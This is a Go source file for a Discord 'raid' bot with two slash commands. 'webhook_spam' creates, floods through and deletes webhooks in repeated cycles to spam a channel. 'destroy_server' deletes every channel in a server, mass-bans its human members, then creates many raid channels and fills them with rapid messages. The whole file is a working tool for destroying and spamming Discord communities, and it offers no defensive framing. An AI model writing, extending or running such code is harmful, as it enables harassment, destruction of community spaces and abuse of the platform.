package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var client = &http.Client{
	Timeout: 10 * time.Second,
	Transport: &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
	},
}

type Webhook struct {
	ID  string
	URL string
}

func handleRateLimit(resp *http.Response) bool {
	if resp.StatusCode == 429 {
		retryAfterStr := resp.Header.Get("Retry-After")
		if retryAfterStr != "" {
			if seconds, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
				time.Sleep(time.Duration(seconds * float64(time.Second)))
				return true
			}
		}
		time.Sleep(1 * time.Second)
		return true
	}
	return false
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		log.Fatal("Error: MASTERGUARD_TOKEN environment variable is not set.")
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Fatalf("Error creating Discord session: %v", err)
	}

	dg.Identify.Intents = discordgo.IntentsGuilds | 
		discordgo.IntentsGuildMessages | 
		discordgo.IntentsGuildMembers | 
		discordgo.IntentsGuildBans

	dg.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		data := i.ApplicationCommandData()
		optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
		for _, opt := range data.Options {
			optionMap[opt.Name] = opt
		}

		switch data.Name {
		case "webhook_spam":
			channelID := i.ChannelID
			if chOpt, ok := optionMap["channel"]; ok {
				channelID = chOpt.ChannelValue(s).ID
			}
			
			messageContent := "Spam Message"
			if msgOpt, ok := optionMap["message"]; ok {
				messageContent = msgOpt.StringValue()
			}

			totalMessages := 50
			if countOpt, ok := optionMap["count"]; ok {
				totalMessages = int(countOpt.IntValue())
			}

			baseName := "spam-wh"
			if nameOpt, ok := optionMap["name"]; ok {
				baseName = nameOpt.StringValue()
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("Starting webhook spam loop for %d messages...", totalMessages),
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			go runWebhookLoop(token, channelID, baseName, messageContent, totalMessages)

		case "destroy_server":
			roomNamePrefix := "raid-room"
			if nameOpt, ok := optionMap["room_name"]; ok {
				roomNamePrefix = nameOpt.StringValue()
			}

			roomCount := 20
			if countOpt, ok := optionMap["room_count"]; ok {
				roomCount = int(countOpt.IntValue())
			}

			msgCount := 5
			if msgCntOpt, ok := optionMap["msg_count"]; ok {
				msgCount = int(msgCntOpt.IntValue())
			}

			messageContent := "Default raid message"
			if msgOpt, ok := optionMap["message"]; ok {
				messageContent = msgOpt.StringValue()
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Executing precise server workflow (Auto-Delete, 50-batch bans, Custom Rooms, 20ms msgs)...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			go runPreciseWorkflow(s, i.GuildID, roomNamePrefix, roomCount, msgCount, messageContent)
		}
	})

	err = dg.Open()
	if err != nil {
		log.Fatalf("Error opening connection: %v", err)
	}
	defer dg.Close()

	commands := []*discordgo.ApplicationCommand{
		{
			Name:        "webhook_spam",
			Description: "Webhook pool loop: creates 10, spams, waits 3s, deletes, repeats",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionChannel,
					Name:        "channel",
					Description: "Target channel",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "message",
					Description: "Message content",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "count",
					Description: "Total messages count",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "name",
					Description: "Webhook base name",
					Required:    false,
				},
			},
		},
		{
			Name:        "destroy_server",
			Description: "Precise server workflow with custom room names, counts, and auto-bans",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "room_name",
					Description: "Custom name for new rooms",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "room_count",
					Description: "Number of rooms to create",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "msg_count",
					Description: "Number of messages per room",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "message",
					Description: "Message content to send",
					Required:    false,
				},
			},
		},
	}

	_, err = dg.ApplicationCommandBulkOverwrite(dg.State.User.ID, "", commands)
	if err != nil {
		log.Fatalf("Cannot register commands: %v", err)
	}

	log.Println("Bot is running. Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
	log.Println("Shutting down.")
}

func runWebhookLoop(token, channelID, baseName, messageContent string, totalMessages int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	sentCount := 0

	for sentCount < totalMessages {
		var pool []Webhook
		var mu sync.Mutex
		var wg sync.WaitGroup

		for i := 0; i < 10; i++ {
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				body, _ := json.Marshal(map[string]string{
					"name": fmt.Sprintf("%s-%d", baseName, idx+1),
				})

				req, err := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(body))
				if err != nil {
					return
				}
				for k, v := range headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				if handleRateLimit(resp) {
					return
				}

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var res map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&res) == nil {
						if id, ok1 := res["id"].(string); ok1 {
							if tk, ok2 := res["token"].(string); ok2 {
								mu.Lock()
								pool = append(pool, Webhook{
									ID:  id,
									URL: fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tk),
								})
								mu.Unlock()
							}
						}
					}
				}
			}(i)
		}
		wg.Wait()

		if len(pool) == 0 {
			time.Sleep(500 * time.Millisecond)
			continue
		}

		var spamWg sync.WaitGroup
		for _, wh := range pool {
			if sentCount >= totalMessages {
				break
			}
			spamWg.Add(1)
			go func(targetWH Webhook) {
				defer spamWg.Done()
				b, _ := json.Marshal(map[string]string{"content": messageContent})
				req, err := http.NewRequest("POST", targetWH.URL, bytes.NewBuffer(b))
				if err != nil {
					return
				}
				req.Header.Set("Content-Type", "application/json")

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				handleRateLimit(resp)
				resp.Body.Close()
			}(wh)
			sentCount++
		}
		spamWg.Wait()

		time.Sleep(3 * time.Second)

		var delWg sync.WaitGroup
		for _, wh := range pool {
			delWg.Add(1)
			go func(webhookID string) {
				defer delWg.Done()
				req, err := http.NewRequest("DELETE", "https://discord.com/api/v10/webhooks/"+webhookID, nil)
				if err != nil {
					return
				}
				for k, v := range headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				handleRateLimit(resp)
				resp.Body.Close()
			}(wh.ID)
		}
		delWg.Wait()
	}
}

func runPreciseWorkflow(s *discordgo.Session, guildID string, roomNamePrefix string, roomCount int, msgCount int, messageContent string) {
	channels, err := s.GuildChannels(guildID)
	if err == nil {
		for _, ch := range channels {
			_, err := s.ChannelDelete(ch.ID)
			if err != nil {
				time.Sleep(1 * time.Second)
			}
			time.Sleep(30 * time.Millisecond)
		}
	}

	members, err := s.GuildMembers(guildID, "", 1000)
	if err == nil && len(members) > 0 {
		var batch []string
		for _, m := range members {
			if m.User.Bot {
				continue
			}
			batch = append(batch, m.User.ID)
			if len(batch) == 50 {
				processBansBatch(s, guildID, batch)
				batch = nil
			}
		}
		if len(batch) > 0 {
			processBansBatch(s, guildID, batch)
		}
	}

	for i := 0; i < roomCount; i++ {
		newChannel, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
			Name: fmt.Sprintf("%s-%d", roomNamePrefix, i+1),
			Type: discordgo.ChannelTypeGuildText,
		})
		
		if err == nil && newChannel != nil {
			go func(chID string) {
				for m := 0; m < msgCount; m++ {
					s.ChannelMessageSend(chID, messageContent)
					time.Sleep(20 * time.Millisecond)
				}
			}(newChannel.ID)
		}
		
		time.Sleep(30 * time.Millisecond)
	}
}

func processBansBatch(s *discordgo.Session, guildID string, userIDs []string) {
	for _, userID := range userIDs {
		err := s.GuildBanCreate(guildID, userID, 1)
		if err != nil {
			time.Sleep(1 * time.Second)
		}
		time.Sleep(100 * time.Millisecond)
	}
}
